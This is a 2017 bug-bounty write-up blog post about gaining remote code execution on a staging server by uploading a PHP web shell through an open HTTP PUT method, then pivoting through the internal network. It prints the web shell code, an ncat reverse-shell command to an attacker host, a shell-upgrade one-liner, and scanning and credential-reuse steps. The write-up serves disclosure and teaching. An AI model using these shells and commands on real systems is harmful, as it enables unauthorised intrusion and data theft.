---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-07-22_may-the-shells-be-with-you-a-star-wars-rce-adventure.md
original_filename: 2017-07-22_may-the-shells-be-with-you-a-star-wars-rce-adventure.md
title: May the Shells be with You - A Star Wars RCE Adventure!
category: documents
detected_topics:
- command-injection
- ssrf
- file-upload
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- ssrf
- file-upload
- automation-abuse
- api-security
language: en
raw_sha256: 9106f9684a81a5cd0049c52751f55b12bd096e36ef9b39c6c794c206bd0f056e
text_sha256: 7ffe051f221753e10ba5bbb9ce9a2ac8ad45eaf30381ca23968e20245ce7ed79
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# May the Shells be with You - A Star Wars RCE Adventure!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-07-22_may-the-shells-be-with-you-a-star-wars-rce-adventure.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, file-upload, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `9106f9684a81a5cd0049c52751f55b12bd096e36ef9b39c6c794c206bd0f056e`
- Text SHA256: `7ffe051f221753e10ba5bbb9ce9a2ac8ad45eaf30381ca23968e20245ce7ed79`


## Content

---
title: "May the Shells be with You - A Star Wars RCE Adventure!"
url: "https://blog.zsec.uk/rce-starwars/"
final_url: "https://blog.zsec.uk/rce-starwars/"
authors: ["Andy Gill (@ZephrFish)"]
bugs: ["RCE"]
publication_date: "2017-07-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6143
---

[bugbounty](https://blog.zsec.uk/tag/bugbounty/)

# May the Shells be with You - A Star Wars RCE Adventure!

[ ![Andy Gill](/content/images/size/w100/2017/10/ZSIcon.png) Andy Gill ](/author/andy/)

22 Jul 2017 · 7 min read

![May the Shells be with You - A Star Wars RCE Adventure!](/content/images/size/w1000/2017/10/Home--star-wars-7--Imax-Star-Wars-posters-dual-4k-.jpg)

Contents

## Intro

Continuing the non-[ltr101](https://blog.zsec.uk/tag/ltr101/) posts for a second here is a quick write-up of a cool bug I found recently on a bounty program. It features Remote Code Execution via an abandoned web service.

Enabling me to traverse the target internal network and gain access to some juicy data. Now it's not often that I manage to find bugs let alone cool ones to write about so hopefully this post is enjoyable to read.

If you can't be bothered reading the tl;dr is I got RCE via a PUT method and turned this into trawling an internal network similar to a red teaming exercise. **NOTE** : Finding PUT method available unauthenticated is very uncommon these days however it is still worth looking for.

## Your Subdomain is called what?!

It all started with the usual recon, look at sub-domains, resolve to IPs then look at ports. However this time around I found a weird hostname with an application running on port `64351`, not your average web port granted most would find it with a full port scan anyway. The domain was similar to (haven't listed the company for confidentiality reasons):

`fast.force.staging.intcorp.yoda.domain.com`

Starting out it popped out to me for a few reasons:

  *  1. It was the only domain with anything other than admin, vpn, email etc in it
  *  2. Mention of intcorp peeked my interest
  *  3. It's not your average sub-domain length
  *  4. fast force staging int corp yoda is a bit random too!

So off I went, resolved the domain. Bingo we have an IP, however browsing to just he domain returned nothing, enter le port scan via nmap:

`nmap -sTV -p- -Pn --max-retries 3 fast.force.staging.intcorp.yoda.domain.com --version-all -oA UsethePowa`

A little while later the port scan result came back:
  
  
  Starting Nmap 7.50 ( https://nmap.org ) at 2017-06-29 22:47 BST
  Nmap scan report for fast.force.staging.intcorp.yoda.domain.com (x.x.x.x)
  Host is up (0.082s latency).
  Not shown: 979 filtered ports
  PORT  STATE  SERVICE  VERSION
  22/tcp  closed ssh
  25/tcp  closed smtp?
  80/tcp  closed http  
  81/tcp  closed hosts2-ns
  90/tcp  open http?
  64351/tcp open http
  2 services unrecognised despite returning data. 
  

Initial identification was made based upon some weird looking files I found in the application's web root on port `64351` each containing phpinfo files however with varying names.

Now the usual way to get files there would be via some form of file upload etc. However in this case I couldn't find anything that looked remotely like a file upload, instead going back to real old school attack enter HTTP Methods.

### HTTP Verbs/Methods

A quick tl;dr on HTTP Verbs/Methods, they are essentially the way in which a request is issued to a server or application. The two most commonly used are `GET` & `POST` for downloading and uploading data to an application. In this case I send an `OPTIONS` request to the server on port `64351` to find out what methods were allowed.

The response indicated that the application accepted `GET`, `POST`, `HEAD` & `PUT`. The first three are pretty common however the `PUT` request is uncommon and the exploit path to upload is even more uncommon.

#### PUT

I managed to use `PUT` to write files to a folder in the webroot called `test`, upon doing this I was able to write any files I wanted, I assumed this was the way those phpinfo files got there in the first place. A quick look around with the web shell found me the phpinfo files again:

![](https://blog.zsec.uk/content/images/2017/10/phpInfo_1-1.png)

So by utilising the PUT method I uploaded a simple PHP web shell, the code of which can be found below:
  
  
  <?php
  if(isset($_REQUEST['cmd'])){
  $cmd = ($_REQUEST["cmd"]);
  system($cmd);
  echo "</pre>$cmd<pre>";
  die;
  }
  ?>
  

It takes commands from the `?cmd` parameter and executes system commands from there. The PUT request was successful and Bingo a shell was achieved, all be it a web shell:

![](https://blog.zsec.uk/content/images/2017/10/webs.png)

### May the Shell be with you!

However I wanted more freedom within this environment to explore. Enter some [OSCP](https://blog.zsec.uk/offsec-achievements-unlocked/) nostalgia, turning a web shell into a reverse shell with netcat. On a lot of hosts you'll be lucky if you have access to netcat let alone [ncat](https://nmap.org/ncat/?ref=blog.zsec.uk)! This server appeared to have access to both which was a lucky day for me!

Using the line below I was able to connect to a listener I'd setup and start to explore more. I spent ages trying to get a port to connect out on but finally settled for `443` as the server was allowing access out over that port.

Command from webshell:  
`ncat -e /bin/bash ATTACKERHOST 443`

Listener Server Side:  
`ncat -l -v -p 443`

Issuing the command from the webshell threw me a nice connect back from the app, at this point I was shaking with excitement! RCE, a web shell now a reverse shell, it's like it was meant to be!  
![](https://blog.zsec.uk/content/images/2017/10/Reverse_catch_1.png)

However thinking back to OSCP it's always nice to have a full bash shell, so with one python one-liner I had an interactive bash shell:  
`python -c 'import pty; pty.spawn("/bin/bash")' `

![](https://blog.zsec.uk/content/images/2017/10/python_upgrade.png)

## Digging Deeper

So at this stage, I decided to have a poke around the OS and see what I could find with my newly acquired interactive shell. Quickly I found some very juicy looking directories within a folder in `/tmp/CorpNet`. This folder contained three other folders:

  * CorpVPNKeys
  * CorpZT
  * CitrixCorp

Digging within these folders yielded some very useful files including one file containing an internal [Zone Transfer](https://en.wikipedia.org/wiki/DNS_zone_transfer?ref=blog.zsec.uk) of the entire domain.

### Finding other hosts

Using the information within the zone transfer files, I identified internal hostnames that looked similar to the original host I'd already discovered including:

  * staging.intcorp.jawa.domain.com `10.0.1.1`
  * staging.internal.sith.domain.com `10.0.1.3`
  * internal.vader.domain.com `10.2.1.13`

Looks like the sysadmin of this network is a star-wars fan! There were many other hosts that shared the star-wars naming scheme. I decided at this stage it was time to do some port scanning given the host had access to `ncat` & `nmap`. I leveraged these to scan the range `10.0.1.0/24` seeking out other interesting hosts.

A quick `nmap -F 10.0.1.0/24`, brought back some really interesting ports including a machine with what looked to be a tonne of open windows ports: `3389,445,135,137,1433,2433`. Bearing in mind this is an internal network having RDP & SMB open is not unheard of.

However as I was limited to what I could use on the box I turned to nmap's scripting engine to see if it would pick up anything. Alas the version of nmap on the compromised box didn't support nmap scripting so that was out :-(.

At this stage I decided to alert the company of the issue I'd discovered and asked if I could continue to dig at the machine, I received a very quick reply stating:

**"Thanks for alerting us, please see how far you can get in the network, we're fairly sure the network internally is secure"**.

Given the 'fairly sure the network internally is secure' statement, I felt I was up for the challenge.

### Challenge Accepted

The next step was seeing if I could traverse the network as I had no hashes or passwords for users. A quick cat of the passwd file showed a user called `emperor` with an interesting `UID`.:

`emperor:x:0:1002:SPalpatine:/home/emperor:/bin/bash`

Now relating back to the star-wars hostnames, this user also appears to be a star-wars reference, notice the `UID` appears to be for the `root` user. However still no password, notice the text between the `GID` and the home directory... SURELY THAT CAN'T BE THE PASSWORD...

![](https://blog.zsec.uk/content/images/2017/10/emperor.png)

![](https://blog.zsec.uk/content/images/2017/07/well.jpg)

At this stage I couldn't believe my luck, root! Now the only natural thing to do was to see if I could log into other machines with the same creds, given there were several hosts on the internal network with SSH open I tried to connect to them with the emperor user.

### Extra Bonus

Of the interesting hosts identified earlier I was able to connect to `internal.vader.domain.com` with the emperor user who also had root privs on this box too.

I was able to dump the hashes from this box and crack them, additionally I discovered the root private key which was used as a master key for signing the VPN certs discovered on the original box. At this stage I wrote up all of my findings and reported to the company under several issues in one report:

  * Remote Code Execution via HTTP Method & Poor Directory Permissions
  * Sensitive Files stored on file system readable by all
  * Password disclosed in `/etc/passwd` for a root user
  * Weak Hashing algorithm in `/etc/shadow`

### Closing Notes

Take aways from this, well the single issue here was poor directory permissions and authentication issues allowing me to upload the initial web shell. However what it does outline is that if you persist with something it can reveal some very fruitful findings.

Other take-aways from this are sysadmins, be careful with your naming schemes don't make your passwords related to the hostname or users as it can be dangerous.

The company have since patched this issue and thanked me for writing up the entire thing for them.

#### Further Reading

  * [HTTP Methods](https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html?ref=blog.zsec.uk)
  * [Web Shells Explained](http://www.binarytides.com/web-shells-tutorial/?ref=blog.zsec.uk)
  * [How to Google](http://lmgtfy.com/?iie=1&q=How+to+search+google+for+information&ref=blog.zsec.uk)
  * [Exploiting PUT Methods](http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html?ref=blog.zsec.uk)

Share [ ](https://twitter.com/intent/tweet?text=May%20the%20Shells%20be%20with%20You%20-%20A%20Star%20Wars%20RCE%20Adventure!&url=https://blog.zsec.uk/rce-starwars/) [ ](https://www.linkedin.com/sharing/share-offsite/?url=https://blog.zsec.uk/rce-starwars/)

[bugbounty](/tag/bugbounty/) [RCE](/tag/rce/) [learning](/tag/learning/) [hacking](/tag/hacking/)
